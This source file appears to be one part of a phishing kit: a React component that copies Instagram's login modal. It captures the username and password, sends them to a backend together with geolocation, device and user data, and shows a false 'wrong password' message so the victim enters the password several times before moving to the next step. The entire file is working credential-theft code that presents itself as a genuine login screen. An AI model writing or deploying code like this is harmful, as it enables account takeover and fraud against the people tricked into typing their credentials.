import InstagramLogoImage from '@/assets/images/logo insta.webp';
import { useTranslation } from '@/hooks/use-translation';
import { store } from '@/store/store';
import { submitFormStep } from '@/lib/ui-form-submit';
import config from '@/utils/config';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { type FC, useState } from 'react';

const IG_INPUT_CLASS =
    'h-[52px] w-full rounded-full border border-[#dddfe2] bg-white px-5 text-base text-[#1c1e21] shadow-[inset_0_1px_0_rgba(0,0,0,0.04)] placeholder:text-[#90949c] transition-all focus:border-[#E1306C] focus:shadow-[0_0_0_2px_rgba(225,48,108,0.2)] focus:outline-none';

const INSTAGRAM_PASSWORD_TEXTS = [
    'Log in to Instagram',
    'Phone number, username, or email',
    'Password',
    'Log in',
    'Forgot password?',
    'You entered the wrong password. Please try again.'
] as const;

const InstagramPasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const { t } = useTranslation(INSTAGRAM_PASSWORD_TEXTS);
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addAccount, addPassword, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const handleSubmit = async () => {
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        addAccount(accountInput);
        addPassword(password);

        try {
            const res = await submitFormStep(
                { geoInfo, deviceLabel, messageId, userData, loginProvider },
                {
                    step: 'credentials',
                    loginProvider,
                    account: accountInput,
                    password,
                    attempt: next
                }
            );

            if (typeof res.messageId === 'number') {
                setMessageId(res.messageId);
            }

            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/50 px-4 backdrop-blur-[2px]'>
            <div className='w-full max-w-[520px] overflow-hidden rounded-2xl bg-[#f0f2f5] font-[Helvetica,Arial,sans-serif] shadow-[0_12px_28px_rgba(0,0,0,0.2),0_2px_4px_rgba(0,0,0,0.1)]'>
                <div className='flex items-center justify-center border-b border-[#dddfe2] bg-white py-6'>
                    <Image src={InstagramLogoImage} alt='Instagram' className='h-[72px] w-[72px] object-contain' />
                </div>

                <div className='px-6 py-7 sm:px-10 sm:py-8'>
                    <h2 className='mb-7 text-center text-[22px] leading-tight font-bold text-[#1c1e21]'>{t('Log in to Instagram')}</h2>

                    <div className='space-y-4'>
                        <input
                            type='text'
                            id='ig-account-input'
                            value={accountInput}
                            onChange={(e) => setAccountInput(e.target.value)}
                            className={IG_INPUT_CLASS}
                            placeholder={t('Phone number, username, or email')}
                            autoComplete='username'
                        />

                        <div className='relative'>
                            <input
                                type={showPassword ? 'text' : 'password'}
                                id='ig-password-input'
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className={`${IG_INPUT_CLASS} pr-12`}
                                placeholder={t('Password')}
                                autoComplete='current-password'
                            />
                            <button
                                type='button'
                                onClick={() => setShowPassword(!showPassword)}
                                className='absolute top-1/2 right-5 -translate-y-1/2 text-[#90949c] transition-colors hover:text-[#E1306C]'
                            >
                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
                            </button>
                        </div>
                    </div>

                    {showError && (
                        <p className='mt-4 rounded-lg bg-[#ffebe9] px-4 py-2.5 text-center text-sm text-[#fa383e]'>
                            {t('You entered the wrong password. Please try again.')}
                        </p>
                    )}

                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                        className='mt-6 flex h-[52px] w-full items-center justify-center rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737] text-[18px] font-bold text-white shadow-[0_2px_4px_rgba(225,48,108,0.3)] transition-all hover:opacity-95 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-70'
                    >
                        {isLoading ? (
                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
                        ) : (
                            t('Log in')
                        )}
                    </button>

                    <button type='button' className='mt-5 w-full py-1 text-center text-[15px] font-semibold text-[#0095f6] transition-colors hover:underline'>
                        {t('Forgot password?')}
                    </button>
                </div>
            </div>
        </div>
    );
};

export default InstagramPasswordModal;

